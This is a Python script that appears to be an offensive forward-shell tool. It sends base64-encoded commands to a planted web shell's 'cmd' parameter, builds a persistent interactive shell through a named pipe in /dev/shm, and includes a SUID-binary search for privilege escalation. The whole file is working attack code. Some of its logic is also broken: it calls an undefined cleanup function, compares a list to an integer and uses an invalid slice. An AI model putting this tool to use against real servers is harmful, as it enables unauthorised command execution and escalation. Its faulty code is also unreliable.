#!/usr/bin/env python3

import requests
import time

from termcolor import colored
from base64 import b64encode
from random import randrange

session = randrange(1000, 9999)
main_url = "http://localhost/index.php"
stdin = f"/dev/shm/{session}.input"
stdout = f"/dev/shm/{session}.output"
help_options = {"enum suid": "Find SUID privileges", "help": "Show this help menu", "exit": "Exit the shell"}
is_pseudo_terminal = False

def run_command(command):
    command = b64encode(command.encode("utf-8")).decode("utf-8")
    data = { "cmd": 'echo "%s" | base64 -d | /bin/sh' % command }

    try:
        r = requests.get(main_url, params=data, timeout=5)
        return r.text
    except:
        pass

def write_stdin(command):
    command = b64encode(command.encode("utf-8")).decode("utf-8")
    data = { "cmd": 'echo "%s" | base64 -d > %s' % (command, stdin) }

    requests.get(main_url, params=data)

def read_stdout():
    for _ in range(5):
        read_stdout_command = f"/bin/cat {stdout}"
        output_command = run_command(read_stdout_command)
        time.sleep(0.2)
    return output_command

def setup_shell():
    command = f"mkfifo {stdin}; tail -f {stdin} | /bin/sh 2>&1 > {stdout}"
    run_command(command)

def clear_stdout():
    command = f"echo '' > {stdout}"
    run_command(command)

def remove_data():
    command = f"/bin/rm {stdin} {stdout}"
    run_command(command)

if __name__ == "__main__":
    setup_shell()
    while True:
        command = input(colored("shell> ", "green"))
        if "script /dev/null -c bash" in command:
            print(colored("[+] New interactive shell", "green"))
            is_pseudo_terminal = True
        
        if command.strip() == "enum suid":
            command = "find / -perm -u=s -type f 2>/dev/null | xargs ls -la"

        if command.strip() == "help":
            for option, description in help_options.items():
                print(colored(f"{option}: {description}", "green"))
            continue

        write_stdin(command + '\n')
        output_command = read_stdout()

        if command.strip() == "exit":
            is_pseudo_terminal = False
            print(colored("[+] Exiting interactive shell", "green"))
            cleanup_shell()
            continue

        if is_pseudo_terminal:
            lines = output_command.split("\n")

            if lines == 3:
                cleared_output = '\n'.join([lines[-1]] + lines[:1])
            elif len(lines) > 3:
                cleared_output = '\n'.join([lines[-1]] + lines[:1] + lines[2,-1])
            print(cleared_output)
        else:
            print(output_command)

        clear_stdout()
